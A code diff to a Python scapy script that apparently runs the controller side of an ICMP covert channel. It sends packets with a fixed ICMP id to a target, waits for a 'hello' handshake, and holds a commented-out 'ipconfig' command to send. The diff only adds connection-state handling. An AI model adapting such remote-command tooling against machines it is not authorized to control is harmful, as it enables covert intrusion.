@@ -16,9 +16,12 @@ import ishell
 from util.Ticker import Ticker
 
 
+is_connected = False
+
+
 async def send_icmp(target_ip, data_to_send):
     packet = IP(dst=target_ip) / ICMP(id=1515) / data_to_send
-    send(packet)
+    send(packet, verbose=False)
     # x = Ether(src='f0:d4:15:84:6b:65', dst='08:00:27:0f:73:c0')
     # sendp(x)
 
@@ -48,8 +51,10 @@ def packet_callback(packet):
 
 
 def hello_packet_callback(packet):
+    global is_connected
     if ICMP in packet and packet[ICMP].type == 0 and packet[ICMP].id == 1515 and packet[ICMP].payload.load.decode(
             'utf-8') == 'hello':
+        is_connected = True
         print("done.")
 
 
@@ -147,8 +152,11 @@ if __name__ == '__main__':
 
     asyncio.run(check_connection())
 
-    while True:
+    while is_connected:
         asyncio.run(main())
+
+    if not is_connected:
+        print("failed.")
     # data_to_send = b"ipconfig"
 #
 # send_icmp_with_data(host_string, data_to_send)
